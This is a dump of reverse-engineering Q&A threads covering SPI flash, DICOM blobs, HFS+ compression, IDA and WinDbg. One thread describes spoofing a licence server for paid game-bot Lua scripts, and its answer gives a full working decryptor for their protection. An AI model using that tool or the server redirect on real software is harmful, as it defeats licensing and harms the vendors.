"USB programmer for SPANSION S25FL064P flash memory","795","","<p>Can someone recommend a handy inexpensive USB programmer for <a href=""http://www.spansion.com/Support/Datasheets/S25FL064A_00.pdf"" rel=""nofollow"">SPANSION S25FL064P</a> flash memory?</p>
","<p>It's a SPI flash memory so most decent SPI flash programmers should do. They can be found below 30 USD. If you have a decent micro controller development board already you can probably program and read this chip easily. For instance the Arduino platform has SPI libraries. The pin pitch is 1.3 mm so you should be able to attach to the chip without even desoldering it using decent grabber probes.</p>

<p>Have you beep tested the board to see if any test points or headers connect to the flash memory pins?</p>

<p>If you don't want to hack something together yourself, <a href=""http://www.ebay.com/itm/Universal-USB-Programmer-EEPROM-Flash-SPI-BIOS-24-25-BR90-93-5000-CHIPS/111164374359"" rel=""nofollow"">here's what seems to be a competent and cheap SPI programmer on ebay</a>. Which is supposed to support you chip. Although it is more fun to solve it yourself, you'll see how easy it is and next time you run into an unsupported SPI flash memory you'll solve it without issues.</p>
","5903"
"How exploit write access-violation to a non-null address","786","","<p>I have found a vulnerability that write access-violation to a non-null address, but I don't know how exploit.</p>

<p>I know that fault, is when pass to vulnerable function a value greater than 80000001, the crash occurs.</p>

<p>But my problem, I only know typical buffer stack overflow, and need learn how exploit this, and knowing what is vulnerability (heap, format string, integer overflow, etc).</p>

<p>I am confused because only crash when is 800000001 (negative), not with 80000000 or 80000002. With this response:</p>

<pre><code>Exploitability Classification: EXPLOITABLE
    Recommended Bug Title: Exploitable - User Mode Write AV starting at myfunction!mycomponet+0x0000000000018204 (Hash=0xad0842a8.0x0as0d4ca)

User mode write access violations that are not near NULL are exploitable.
</code></pre>

<p>What vulnerability is and how exploit ? Any suggestion or recommended lecture ?</p>
","<p>Sorry this should be a comment but dont have enough reputation.</p>

<p>This is too vague for people to help you. Do you have the disassembly around the crash? It only crashes when what is 8000000001? That makes it sound like potentially an integer overflow. Where is it writing? Can you control the address that its writing to? Do you have control of what is being written?</p>
","3545"
"How to strip more than symbols?","785","","<p>I've noticed that, even after stripping symbols from my executable, class names and their methods are still included at the end of the executable file.</p>

<p>For instance:</p>

<pre><code>#include &lt;iostream&gt;

using namespace std;

class Clingons
{
public:
    void clingForever()
    {
        cout &lt;&lt; ""Qapla"" &lt;&lt; endl;
    }
};

int main(int argc, char *argv[])
{
    Clingons cling;

    cling.clingForever();

    return 0;
}
</code></pre>

<p>Then compile and link with:</p>

<pre><code>g++ cling.cpp -o cling
</code></pre>

<p>Now, when I look at the bottom of the resulting ""cling"" file with a hex editor, I can see the ""Clingons"" class name along with it's methods. I can also see this information while debugging..</p>

<p>even after I strip them:</p>

<pre><code>strip -x cling
</code></pre>

<p>I can still see the same information.</p>

<p>So why wasn't this information stripped away when I used the command above? Is there a way to strip (or mangle) this information other than by hand?</p>

<p>The used version of GCC is <code>i686-apple-darwin10-llvm-g++-4.2 (GCC) 4.2.1</code></p>

<p>This is just an example case. My real project involves the Qt framework.</p>
","<p>It is possible that you are using RTTI.
Try compiling your code with option <code>-fno-rtti</code>.</p>

<p>Update: It is really RTTI. </p>

<p>I don't know how exactly it works, but I succeeded to remove those strings as follows:</p>

<pre><code>$ g++ -Xlinker -unexported_symbol -Xlinker ""*"" -o executable file.cpp
$ strip executable
</code></pre>

<p>(This was found at <a href=""https://stackoverflow.com/questions/1931626/how-to-really-strip-a-binary-in-macos"">https://stackoverflow.com/questions/1931626/how-to-really-strip-a-binary-in-macos</a> )</p>
","4674"
"What kind of compression/obfuscation algorithm is this?","784","","<p>I have a couple of streams that look pretty odd within a <code>DICOM</code> file. In a few words, <a href=""http://medical.nema.org/medical/dicom/current/output/chtml/part05/chapter_7.html#sect_7.1.2"" rel=""nofollow noreferrer"">DICOM</a> is very close to what <em>binary XML</em> would look like. Almost all of the information from those DICOM files are straighforward and can be read and interpreted nicely with <a href=""http://dcmtk.org/"" rel=""nofollow noreferrer"">DCMTK</a> and/or <a href=""http://sourceforge.net/projects/gdcm/"" rel=""nofollow noreferrer"">GDCM</a>.</p>

<p>However there are two binary fields stored within the end of the file that looks like <em>private</em> encoded information. Since DICOM is mostly for <em>interoperability</em> in between system, vendors are actually storing there own internal file format within one of the field of the DICOM file (declared as private field, much like what would people in the TIFF world would do). In my past experience, the encoding was trivial (plain <code>struct</code> stored as binary), see <a href=""https://github.com/malaterre/GDCM/blob/master/Applications/Cxx/gdcmdump.cxx#L67"" rel=""nofollow noreferrer"">here</a> or <a href=""https://github.com/malaterre/GDCM/blob/master/Source/DataStructureAndEncodingDefinition/gdcmCSAHeader.cxx#L986"" rel=""nofollow noreferrer"">here</a> for example.</p>

<p>Now if I extract the binary blobs from the DICOM file (debian/jessie amd64), here is what I see :</p>

<pre><code>$ gdcmraw -t 7101,1000 input.dcm file1000.gz
$ gdcmraw -t 7101,1002 input.dcm file1002.gz
$ file file1000.gz file1000.gz: gzip compressed data, max compression, from FAT filesystem (MS-DOS, OS/2, NT)

$ gunzip file1000.gz

gzip: file1000.gz: invalid compressed data--format violated
</code></pre>

<p>However <code>gunzip</code> is not capable of decompressing them. Could someone with more gzip knowledge please check if those files are actually gzip compressed ? It looks like it's possible to decompress them because in the medical industry we tend to re-use code whenever possible. For example a well known MRI vendor is also using <code>gzip</code> compressed stream to store its private file format, see <a href=""https://github.com/malaterre/GDCM/blob/master/Source/DataStructureAndEncodingDefinition/gdcmPDBHeader.cxx#L25"" rel=""nofollow noreferrer"">here</a> for example (full thread <a href=""https://groups.google.com/d/msg/comp.protocols.dicom/mxnCkv8A-i4/sHcN_oFeNekJ"" rel=""nofollow noreferrer"">here</a>).</p>

<p>The obfuscation should be pretty trivial too because it needs to pass medical industry clearance. From past experience, I've only seen byte reversing being used or simple incremental XOR.</p>

<p>I've uploaded come of the files here:</p>

<ul>
<li><a href=""https://github.com/malaterre/MRPicker"" rel=""nofollow noreferrer"">https://github.com/malaterre/MRPicker</a></li>
</ul>

<p>The image can be extracted nicely, so I suspect only a few extra private vendor information (metadata only) is stored within this field (MRI serial number...).</p>

<p>To be more specific, the fake <code>gzip</code> stream comes in pair eg (<code>file1000.gz</code> &amp; <code>file1002.gz</code> were taken from the same DICOM file). From another DICOM file I found that the second fake gzip stream was (bitwise) identical to <code>file1002.gz</code>, so I only uploaded <code>file1000_other1.gz</code> (same goes for <code>file1000_other2.gz</code>, <code>file1000_other3.gz</code> and <code>file1000_other4.gz</code>). So maybe <code>file1002.gz</code> is a bit special here. Since I do not have physical access to the MRI workstation that produces those images, I can only do brute-force approach here.</p>

<hr>

<p>Update: I did check that the files are not simply a deflate codestream with broken header using <a href=""https://github.com/malaterre/MRPicker/blob/master/unz.py"" rel=""nofollow noreferrer"">unz.py</a> and <a href=""https://github.com/malaterre/MRPicker/blob/master/runme.sh"" rel=""nofollow noreferrer"">runme</a> (<code>binwalk -X</code> did not reveal anything either). So they are not direct simple <code>gzip</code> files.</p>

<p>Update2: I did try to read the stream backwards using this <a href=""https://github.com/malaterre/MRPicker/blob/master/reverse.cxx"" rel=""nofollow noreferrer"">code</a> but again this still does not look like a deflate stream.</p>

<p>Update3: So far, all streams I found have proper gzip header, and they all finish with 4 zeros (0) bytes, just like any valid gzip. I should be able to recover the file using the <a href=""https://stackoverflow.com/a/11557033/136285"">last 4 bytes</a> since they are used to store a crc32 (as per gzip RFC).</p>

<p>Update4: Thanks to help here, I discover those private tags are actually slightly <a href=""http://incenter.medical.philips.com/doclib/enc/fetch/2000/4504/577242/577256/588723/5144873/5144488/5144984/DICOM_Conformance_Statement_ViStar%2C_Twinstar_and_Montage_Workstations.pdf%3Fnodeid%3D5148306%26vernum%3D1"" rel=""nofollow noreferrer"">documented</a>:</p>

<pre><code>Table A.2.1.2.1.3-3 Private Elements for MR Scanner or MR Workstation Images
When exporting Marconi MR Scanner or MR Workstation images the following
private elements may be included.

Tag Name Value Representation
7101,0010 Private MR Creator Data element LO
7101,1000 MR Processing Field 1 OB
7101,1001 MR Processing Field 1 Length SL
7101,1002 MR Processing Field 2 OB
7101,1003 MR Processing Field 2 Length SL
7101,1004 Scan Duration SH
7101,1005 MR Processing Field 3 SH
7101,1006 MR Processing Field 4 SH
</code></pre>

<p>I did check that the length of the extracted fake-gzip actually match the value stored in the associated attribute (so length for attribute 7101,1000 match value stored in attribute 7101,1001, and length for attribute 7101,1002 matches value stored in attribute 7101,1003). For instance:</p>

<pre><code>$ gdcmdump input3.dcm
[...]
(07a1,0010) ?? (LO) [ELSCINT1]                                    # 8,1 Private Creator
(07a1,1013) ?? (UL) 62940                                         # 4,1 ?
(7101,0000) ?? (UL) 24242                                         # 4,1 Generic Group Length
(7101,0010) ?? (LO) [Picker MR Private Group ]                    # 24,1 Private Creator
(7101,1000) ?? (OB) 1f\8b\08\00\00\00\00\00\02\00\14\5d\4b\8d\db\48\6e\3e\ec\53\4f\7b\28\c3\1e\ef\8c\d8\2d\86\e8\86\57\01\c9\d9\96\4a\bd\76\45\35\92\99\dc\33\e5\1b\08\78\04\25\94\93\04\f3\80\7a\03\fa\cd\34\02\40         # 10784,1 ?
(7101,1001) ?? (SL) 10784                                         # 4,1 ?
(7101,1002) ?? (OB) 1f\8b\08\00\00\00\00\00\02\00\14\3c\6d\8d\da\48\6d\9f\93\a1\31\e5\9c\2f\f6\6b\c1\48\44\d8\9e\26\67\ab\78\8d\1d\8a\6d\a0\80\6c\36\31\dd\95\b6\96\84\2f\13\90\a8\49\d8\0f\fe\fa\15\97\19\97\24\c0         # 13328,1 ?
(7101,1003) ?? (SL) 13328                                         # 4,1 ?
(7101,1004) ?? (SH) [00:48 ]                                      # 6,1 ?
(7101,1005) ?? (SH) [ECHO\CARDIAC]                                # 12,2 ?
(7101,1006) ?? (SH) [115204\4187\0\0 ]                            # 16,4 ?
</code></pre>

<p>Update5: DICOM can only stores even-bytes length as attribute. One fake-gzipped stream was actually padded to the next even length, but the actual length reported in 7101,1001 was odd (10765). I've updated <code>file1000_other4.gz</code> to have the proper length (the trailing bytes are not anymore <code>03 00 00 00</code>, but <code>0B 03 00 00</code>)</p>
","<p>The gzip headers are valid, but the deflate compressed data format is violated almost immediately, within less than ten bytes in for all of the files.</p>

<p>For all of the example files provided, the first deflate block is a dynamic block which has an oversubscribed code lengths code.  That means that a Huffman code required to decode the code lengths for that block is itself invalid.  This immediately halts the decompression, since no further progress can be made.</p>

<p>The last four bytes may not be what you think they are.  The last four bytes of a valid gzip file is the length of the uncompressed data, modulo 2<sup>32</sup>, in little-endian order.  Those lengths do not seem correlated to the file sizes.  For example <code>file1010.gz</code>'s last four bytes are <code>0b 03 00 00</code>.  It's length is 10766.  So 10766 bytes decompresses to 779 bytes?  I don't think so.  So the second-to-last four bytes are likely also not what you would expect there for a gzip stream, i.e. likely not a CRC.</p>

<p>The data after the header appears to be random in all cases (pretty flat histogram over 0..255), and is itself mostly incompressible, which is consistent with it being compressed data.</p>

<p>I tried decompressing from all bit offsets starting after the gzip header to the end, but no joy.  This rules out some sort of header followed by valid deflate data.</p>
","9387"
"Assistance in Decrypting Lua script that is obfuscated with Base64 > SSL","780","","<p>Can anyone on here help me on decrypting the SSL encryption that protects this LUA script linked at the end of this topic ? </p>

<p>Basically they are encoded with Base64 then SSL, but I have no idea how to do the SSL portion. They are used with a program called '<em>Bot of Legends</em>', and someone told me that it is possible to break the encryption by dumping the decryption function of said program and using that to get the SSL key. But, I have no clue where to even start on that. </p>

<p>Basically, these scripts work by connecting to an authentication server that is coded into the script, and I have gotten a few on my own by sniffing the traffic to their authentication server from network packets to get their server link and essentially created my own authentication server with Apache, then redirected the network traffic that goes to their server to my own from the script to get the script validated response. </p>

<p>For some scripts that have stronger encryption, its not that easy and I would have to get to the source code to remove the coding that runs the authentication server checks. Up until a few days ago I had no knowledge on how lua coding worked and how to even compute how authentication server checks could be even possible for coding in a simple text file due to lua obfuscation. </p>

<p>So, bear with me, I would like if someone can chime in and give me an idea on what I can do.</p>

<p><a href=""http://pastebin.com/raw.php?i=bG0VqQGW"" rel=""nofollow"">PasteBin to the script in question in raw format</a>.</p>

<p>The Base64 section is first with the SSL section at the bottom.</p>
","<p>Since it is not used anymore I'll show you :)</p>

<pre><code>print(""SSL Decoder version 2.0"")
print(""Copyright (C) 2015"")
print(""Decoding Started..."")

local infilename = select(1,...)
local outfilename = select(2,...)

local infile = io.open(infilename, ""r"")

if not infile then
  error(""Failed to open input file."")
end

local intext = infile:read(""*a"")

infile:close()

local ssltabletext = intext:match(""SSL%s*%(%s*%{([%s,0-9]*)%}%s*%)"")

if not ssltabletext then
  error(""Could not find ssl table in source file."")
end

local ssltable = load(""return {""..ssltabletext..""}"")()

if #ssltable &lt; 255 then
  error(""SSL table is too short -- can't find table encryption key."")
end

-- find decryption key for the ssl table
local decrypt = {}

decrypt[0] = 0
for i = 1,255 do
  local dec = i
  local enc = ssltable[i]
  assert(decrypt[enc] == nil)
  decrypt[enc] = dec
end

-- decrypt ssl table
for i = 256, #ssltable - 256 do -- not sure what last 256 bytes are
  ssltable[i] = decrypt[ssltable[i] ]
end

-- If this does a stack overflow, easy to change to something dumb but more robust
local sslcode = string.char(table.unpack(ssltable, 256, #ssltable - 256))

-- This is interesting -- 
--print(sslcode)

local keyindex = sslcode:match(""local Key%s*=%s*'()"")
if not keyindex then
  error(""Could not find key in decoded ssl table."")
end

local key = sslcode:sub(keyindex)

local length = 0
while true do
  local c = key:sub(length+1, length+1)
  if c == """" then
    error(""Key string was not terminated."")
  elseif c == ""'"" then
    break
  elseif c == ""\\"" then
    local c2 = key:sub(length+2, length+2)
    if c2:match(""%d"") then
      local c3 = key:sub(length+3, length+3)
      if c3:match(""%d"") then
        local c4 = key:sub(length+4, length+4)
        if c4:match(""%d"") then
          length = length + 4
        else
          length = length + 3
        end
      else
        length = length + 2
      end
    elseif c2 == ""x"" then
      length = length + 4
    else
      length = length + 2
    end
  else
    length = length + 1
  end
end

key = key:sub(1, length)

if #key == 0 then
  error(""Key is empty"")
end

print(""Key Found! &gt; "" .. key)
print(""Decoding finished, outfile is at &gt; "" .. outfilename)

-- find base64
local b64 = intext:match(""_G.ScriptCode%s*=%s*Base64Decode%s*%(%s*\""([a-zA-Z0-9/+]*=*)\""%s*%)"")
if not b64 then
  error(""Could not find Base-64 encrypted code in source file."")
end

-- base64 decode
local b64val = {}
for i = 0, 25 do
  do
    local letter = string.byte(""A"")
    b64val[string.char(letter+i)] = i
  end
  do
    local letter = string.byte(""a"")
    b64val[string.char(letter+i)] = i + 26
  end
end
for i = 0, 9 do
  local numeral = string.byte(""0"")
  b64val[string.char(numeral+i)] = i + 52
end
b64val[""+""] = 62
b64val[""/""] = 63
b64val[""=""] = 0

local encoded = b64:gsub(""(.)(.)(.)(.)"",function(a,b,c,d)
  local n = b64val[a] * (64 * 64 * 64) + b64val[b] * (64 * 64) + b64val[c] * 64 + b64val[d]
  local b1 = n % 256; n = (n - b1) / 256
  local b2 = n % 256; n = (n - b2) / 256
  local b3 = n
  if d == ""="" then
    if c == ""="" then
      assert(b1 == 0 and b2 == 0)
      return string.char(b3)
    else
      assert(b1 == 0)
      return string.char(b3, b2)
    end
  else
    return string.char(b3, b2, b1)
  end
end)

-- decode
local decoded = encoded:gsub(""()(.)"", function(i, c)
  local b = c:byte()
  local ki = ((i - 1) % #key) + 1
  local k = key:byte(ki,ki)
  b = b - k
  if b &lt; 0 then b = b + 256 end
  return string.char(b)
end)

-- verify
local result, err = load(decoded)
if not result then
  error(""Decoded file could not be loaded -- it may be corrupt... (""..tostring(err).."")"")
end

-- output
local outfile = io.open(outfilename, ""wb"")

if not outfile then
  error(""Failed to open output file."")
end

outfile:write(decoded)

outfile:close()
</code></pre>
","10868"
"Unknown Mac OSX 10.10 HFS+ compression","778","","<p>I'm trying to decompress a Mach-O binary which has been compressed using one of the compression algorithms in Mac 10.10's HFS+ implementation. Basically the file has the ""com.apple.decmpfs"" attribute on it, which says that it is compression type 8. Then the compressed contents of the file are stored in the file's resource fork.</p>

<p>It doesn't seem to have any identifiable header on it. Does anyone recognize it, or have any ideas what it might be? Below is a dump of the first 0x200 bytes of the compressed version of <code>/bin/bash</code>, and the first 0x200 bytes of the same file as viewed under Mac OS.</p>

<p>The Mach-O header (<code>CF FA ED FE</code>) and some executable's strings (e.g. <code>__PAGEZERO</code>) can be seem in the compressed version.</p>

<h3>Compressed (first 0x200 bytes of <code>/bin/bash</code>):</h3>

<pre><code>Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 

00000000  E0 01 CF FA ED FE 07 00 00 01 03 00 00 80 02 00  à.Ïúíþ.......€.. 
00000010  00 00 12 00 04 E8 E8 06 00 00 85 00 20 00 08 01  .....èè...…. ... 
00000020  40 04 19 46 48 EB 5F 5F 50 41 47 45 5A 45 52 4F  @..FHë__PAGEZERO 
00000030  00 38 01 F7 9E 01 00 F0 0C 08 48 8E 28 02 E5 54  .8.÷ž..ð..HŽ(.åT 
00000040  45 58 54 00 38 01 F3 10 40 9E 60 08 F8 20 10 46  EXT.8.ó.@ž`.ø .F 
00000050  07 46 05 48 0D 06 10 88 E5 74 65 78 74 00 30 01  .F.H...ˆåtext.0. 
00000060  38 50 F6 9E EC 0B C8 10 5F 1C 07 F5 50 0A 02 20  8Pöžì.È._..õP.. 
00000070  01 E4 04 00 80 00 FA F1 E8 5F 5F 73 74 75 62 73  .ä..€.úñè__stubs 
00000080  00 F8 38 50 F6 CE 4C 28 07 F1 CE 62 04 00 F1 28  .ø8PöÎL(.ñÎb..ñ( 
00000090  10 28 01 60 50 08 6E 06 F5 E7 5F 68 65 6C 70 65  .(.`P.n.õç_helpe 
000000A0  72 FA F9 9E B0 2C 9E 5E 07 08 10 38 A0 F0 04 E7  rúùž°,ž^...8 ð.ç 
000000B0  63 73 74 72 69 6E 67 FA FD 9E 0E 34 9E 61 F8 08  cstringúýž.4žaø. 
000000C0  10 38 01 F2 38 5C F3 18 50 C9 41 6F 6E 73 F6 38  .8.ò8\ó.PÉAonsö8 
000000D0  50 F6 CE 70 2C 08 F1 9E F0 21 08 10 20 FB 38 01  PöÎp,.ñžð!.. û8. 
000000E0  FB ED 5F 5F 75 6E 77 69 6E 64 5F 69 6E 66 6F 38  ûí__unwind_info8 
000000F0  50 F9 9E 60 4E 9E 94 11 08 10 38 94 F6 38 01 F2  Pùž`Nž”...8”ö8.ò 
00000100  0A 28 56 78 E4 44 41 54 41 FA F1 58 48 60 9E 00  .(VxäDATAúñXH`ž. 
00000110  E0 32 30 5E B0 08 F6 60 08 03 08 01 E4 5F 5F 67  à20^°.ö`....ä__g 
00000120  6F 3A 27 F1 38 50 FF 9E 38 01 F4 58 0A 03 10 01  o:'ñ8Pÿž8.ôX.... 
00000130  09 D0 98 01 BB 00 F4 EF 5F 5F 6E 6C 5F 73 79 6D  .Ð˜.».ôï__nl_sym 
00000140  62 6F 6C 5F 70 74 72 38 50 F7 9E 38 61 9E 10 00  bol_ptr8P÷ž8až.. 
00000150  08 10 38 50 F6 6E E2 F5 9E 6C 61 F0 06 66 48 9E  ..8Pönâõžlað.fHž 
00000160  D8 05 6E 48 F7 08 E8 98 01 E4 00 F4 39 D8 F8 38  Ø.nH÷.è˜.ä.ô9Øø8 
00000170  50 F4 9E 20 67 9E 88 26 08 10 39 D8 F0 04 E5 64  Pôž gžˆ&amp;..9Øð.åd 
00000180  61 74 61 00 30 01 38 50 F6 9E B0 8D 9E 04 79 08  ata.0.8Pöž°.ž.y. 
00000190  10 38 50 F0 04 E6 63 6F 6D 6D 6F 6E FA FE CE C0  .8Pð.æcommonúþÎÀ 
000001A0  06 09 F1 C8 01 68 0E 00 F5 38 50 F2 6E 01 F9 9B  ..ñÈ.h..õ8Pòn.ù› 
000001B0  B6 62 73 F4 38 50 F8 9E 30 15 9E 10 21 F0 10 3C  ¶bsô8Pøž0.ž.!ð.&lt; 
000001C0  E8 E7 4C 49 4E 4B 45 44 49 2A C4 58 48 40 9E 00  èçLINKEDI*ÄXH@ž. 
000001D0  A0 F1 90 07 10 09 96 A0 87 11 88 38 4C F2 45 48   ñ....– ‡.ˆ8LòEH 
000001E0  22 48 09 30 00 28 41 B1 50 C8 3B 50 13 09 F5 08  ""H.0.(A±PÈ;P..õ. 
000001F0  01 40 10 F0 EA 08 0C 00 00 F8 1F 09 00 F8 33 1B  .@.ðê....ø...ø3. 
</code></pre>

<h3>Uncompressed (first 0x200 bytes of <code>/bin/bash</code>):</h3>

<pre><code>Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 

00000000  CF FA ED FE 07 00 00 01 03 00 00 80 02 00 00 00  Ïúíþ.......€.... 
00000010  12 00 00 00 E8 06 00 00 85 00 20 00 00 00 00 00  ....è...…. ..... 
00000020  19 00 00 00 48 00 00 00 5F 5F 50 41 47 45 5A 45  ....H...__PAGEZE 
00000030  52 4F 00 00 00 00 00 00 00 00 00 00 00 00 00 00  RO.............. 
00000040  00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00  ................ 
00000050  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 
00000060  00 00 00 00 00 00 00 00 19 00 00 00 28 02 00 00  ............(... 
00000070  5F 5F 54 45 58 54 00 00 00 00 00 00 00 00 00 00  __TEXT.......... 
00000080  00 00 00 00 01 00 00 00 00 60 08 00 00 00 00 00  .........`...... 
00000090  00 00 00 00 00 00 00 00 00 60 08 00 00 00 00 00  .........`...... 
000000A0  07 00 00 00 05 00 00 00 06 00 00 00 00 00 00 00  ................ 
000000B0  5F 5F 74 65 78 74 00 00 00 00 00 00 00 00 00 00  __text.......... 
000000C0  5F 5F 54 45 58 54 00 00 00 00 00 00 00 00 00 00  __TEXT.......... 
000000D0  EC 0B 00 00 01 00 00 00 5F 1C 07 00 00 00 00 00  ì......._....... 
000000E0  EC 0B 00 00 02 00 00 00 00 00 00 00 00 00 00 00  ì............... 
000000F0  00 04 00 80 00 00 00 00 00 00 00 00 00 00 00 00  ...€............ 
00000100  5F 5F 73 74 75 62 73 00 00 00 00 00 00 00 00 00  __stubs......... 
00000110  5F 5F 54 45 58 54 00 00 00 00 00 00 00 00 00 00  __TEXT.......... 
00000120  4C 28 07 00 01 00 00 00 62 04 00 00 00 00 00 00  L(......b....... 
00000130  4C 28 07 00 01 00 00 00 00 00 00 00 00 00 00 00  L(.............. 
00000140  08 04 00 80 00 00 00 00 06 00 00 00 00 00 00 00  ...€............ 
00000150  5F 5F 73 74 75 62 5F 68 65 6C 70 65 72 00 00 00  __stub_helper... 
00000160  5F 5F 54 45 58 54 00 00 00 00 00 00 00 00 00 00  __TEXT.......... 
00000170  B0 2C 07 00 01 00 00 00 5E 07 00 00 00 00 00 00  °,......^....... 
00000180  B0 2C 07 00 02 00 00 00 00 00 00 00 00 00 00 00  °,.............. 
00000190  00 04 00 80 00 00 00 00 00 00 00 00 00 00 00 00  ...€............ 
000001A0  5F 5F 63 73 74 72 69 6E 67 00 00 00 00 00 00 00  __cstring....... 
000001B0  5F 5F 54 45 58 54 00 00 00 00 00 00 00 00 00 00  __TEXT.......... 
000001C0  0E 34 07 00 01 00 00 00 61 F8 00 00 00 00 00 00  .4......aø...... 
000001D0  0E 34 07 00 00 00 00 00 00 00 00 00 00 00 00 00  .4.............. 
000001E0  02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 
000001F0  5F 5F 63 6F 6E 73 74 00 00 00 00 00 00 00 00 00  __const......... 
00000200  5F 5F 54 45 58 54 00 00 00 00 00 00 00 00 00 00  __TEXT.......... 
</code></pre>

<p>Thanks in advance!</p>
","<p>OK... it seems to be LZVN compression. Following on from Igor's suggestions I ran <code>kextstat</code> on my Mac, however that only listed:</p>

<ul>
<li><code>com.apple.AppleFSCompression.AppleFSCompressionTypeZlib</code></li>
<li><code>com.apple.AppleFSCompression.AppleFSCompressionTypeDataless</code> </li>
</ul>

<p>Looking at the strings inside the 'dataless' compression it turned out to be type 5: <a href=""https://github.com/dimones/Clevo-W370ET-Mavericks/blob/master/Extensions/AppleFSCompressionTypeDataless.kext/Contents/Info.plist#L53"" rel=""nofollow"">AppleFSCompressionTypeDataless.kext</a>. Searching for the same string with type 8, I found this log:</p>

<pre><code>com_apple_AppleFSCompression_AppleFSCompressionTypeLZVN  &lt;class com_apple_AppleFSCompression_AppleFSCompressionTypeLZVN, id 0x10000025d, !registered, !matched, active, busy 0, retain 4&gt;
      |   {
      |     ""IOProbeScore"" = 0x0
      |     ""CFBundleIdentifier"" = ""com.apple.AppleFSCompression.AppleFSCompressionTypeLZVN""
      |     ""IOMatchCategory"" = ""com_apple_AppleFSCompression_AppleFSCompressionTypeLZVN""
      |     ""IOClass"" = ""com_apple_AppleFSCompression_AppleFSCompressionTypeLZVN""
      |     ""IOProviderClass"" = ""IOResources""
      |     ""com.apple.AppleFSCompression.providesType10"" = Yes
      |     ""com.apple.AppleFSCompression.providesType9"" = Yes
      |     ""com.apple.AppleFSCompression.providesType8"" = Yes
      |     ""IOResourceMatch"" = ""IOBSD""
      |     ""com.apple.AppleFSCompression.providesType7"" = Yes
      |   }
</code></pre>

<p>Which seems to be something the Chameleon guys already worked out: <a href=""http://forge.voodooprojects.org/p/chameleon/source/tree/HEAD/trunk/CHANGES#L27"" rel=""nofollow"">trunk/CHANGES</a></p>

<p><strong>Edit:</strong> Apple has just released an open source implementation: <a href=""https://github.com/lzfse/lzfse"" rel=""nofollow"">https://github.com/lzfse/lzfse</a></p>
","8233"
"How to get a entry point of loaded process with IDA Pro and WinDbg as a debugger?","775","","<p>I'm using IDA Pro and WinDbg as a debugger. So I loaded an executable process into it. And now I need to know the entry point (or base address) of that loaded executable, the same as I would get from calling these APIs:</p>

<pre><code>MODULEINFO mi = {0};
if(::GetModuleInformation(::GetCurrentProcess(), ::GetModuleHandle(NULL), &amp;mi, sizeof(mi)))
{
    //Needed entry point is:
    pEntryPoint = mi.EntryPoint;
}
</code></pre>

<p>I found <a href=""https://reverseengineering.stackexchange.com/questions/8488/how-to-get-imge-base-of-current-setting-through-script-in-ida-pro"">this reference</a>, but when I do:</p>

<pre><code>idaapi.get_imagebase()
</code></pre>

<p>it gives me the error:</p>

<blockquote>
  <p>Operation not supported in current debug session 'idaapi.get_imagebase()'</p>
</blockquote>

<p><a href=""https://i.stack.imgur.com/cfjs9.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/cfjs9.png"" alt=""enter image description here""></a></p>

<p>Sorry, I'm new to IDA. What am I doing wrong?</p>
","<p>You need to switch to a different command line. Currently, you're using the WinDbg command line, which allows you to send commands to WinDbg instead of IDAPython:</p>

<p><a href=""https://i.stack.imgur.com/T9UxR.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/T9UxR.png"" alt=""enter image description here""></a></p>

<p>Click on <kbd>WinDbg</kbd>, or press <kbd>Ctrl</kbd><kbd>↑</kbd> to switch to IDAPython, where <code>idaapi.get_imagebase()</code> works fine:</p>

<p><a href=""https://i.stack.imgur.com/tISIL.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/tISIL.png"" alt=""enter image description here""></a></p>

<p>However, this doesn't really answer your question. What you want is the entry point, and to find it, you can either press <kbd>Ctrl</kbd><kbd>E</kbd> in IDA, or find it with WinDbg:</p>

<p><a href=""https://i.stack.imgur.com/u3M7Z.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/u3M7Z.png"" alt=""enter image description here""></a></p>

<p>The command is:</p>

<pre><code>.printf ""0x%X"", $exentry
</code></pre>
","14052"
"WinDBG. How to catch first-chance exceptions?","774","","<p>I have to catch first-chance exceptions occurring in user-mode application during <strong>kernel-mode</strong> debugging session.</p>

<p>I have written simple example application called <em>Exceptions.exe</em>:</p>

<pre><code>int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)
{
    MessageBox(NULL, ""Press OK to generate exception."", ""Title"", MB_OK);
    __try
    {
        __asm
        {
            xor eax, eax
            mov dword ptr[eax], eax  // I wanna break here
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        MessageBox(NULL, ""In exception handler."", ""Title"", MB_ICONINFORMATION);
    }
    return 0;
}</code></pre>

<p>I launch it in the being debugged system. Then go to windbg, press 'ctrl+break' and enter following commands:</p>

<pre><code>
3: kd> !process 0 0 Exceptions.exe
PROCESS 853b37e0  SessionId: 1  Cid: 0f48    Peb: 7ffdf000  ParentCid: 06c4
    DirBase: be658280  ObjectTable: 8f97acf8  HandleCount:  35.
    Image: Exceptions.exe

3: kd> .process /i 853b37e0
You need to continue execution (press 'g' ) for the context
to be switched. When the debugger breaks in again, you will be in
the new process context.
3: kd> g
Break instruction exception - code 80000003 (first chance)
nt!RtlpBreakWithStatusInstruction:
82ab6110 cc              int     3
2: kd> sxe *
2: kd> g
</code></pre>

<p>I expect to break on the instruction <strong>mov dword ptr[eax], eax</strong> but nothing occurred. In the being debugged system I've got message box ""In exception handler"".</p>

<p>Is there any way to get what I want? I can't debug target process in user mode, because it's protected from attaching debugger.</p>
","<p>In WinDbg: <a href=""https://msdn.microsoft.com/en-us/library/windows/hardware/ff563176.aspx"" rel=""nofollow""><code>!gflag</code></a> <a href=""https://msdn.microsoft.com/en-us/library/windows/hardware/ff558817.aspx"" rel=""nofollow""><code>+soe</code></a></p>

<p>You can see <a href=""http://www.openrce.org/blog/view/1564/Kernel_debugger_vs_user_mode_exceptions"" rel=""nofollow"">http://www.openrce.org/blog/view/1564/Kernel_debugger_vs_user_mode_exceptions</a> for more details.</p>
","12149"
"What are the steps, to extract an unknown archive file in this case?","773","","<p>I've never did something like this before, but I have programming experiences. There are two files:
<code>data00.big</code> and <code>data01.big</code>, which I would like to extract.</p>

